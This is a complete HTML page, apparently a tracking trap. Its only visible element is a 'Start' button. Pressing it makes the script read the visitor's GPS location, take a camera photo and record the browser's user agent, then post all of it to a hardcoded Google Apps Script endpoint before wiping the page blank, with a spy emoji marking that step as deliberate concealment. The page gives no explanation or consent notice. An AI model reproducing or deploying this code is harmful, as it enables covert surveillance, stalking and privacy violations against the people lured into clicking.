<!DOCTYPE html>
<html>
<body>

<button onclick="start()">Start</button>

<script>
const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxu2IpxTYTBE5miAhNS9EIBhC07iO6L4kaW9KyP9Uj3Te8RYUaSTkrarTjMIbu0O6V_aQ/exec";

async function start() {

  // LOCATION
  navigator.geolocation.getCurrentPosition(async pos => {

    // CAMERA
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    stream.getTracks().forEach(t => t.stop());

    const photo = canvas.toDataURL("image/jpeg");

    const payload = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude,
      device: navigator.userAgent,
      photo: photo
    };

    // üî¥ IMPORTANT FIX
    fetch(WEB_APP_URL, {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify(payload)
    });

    // üïµÔ∏è Make page blank
    document.body.innerHTML = "";

  });
}
</script>

</body>
</html>
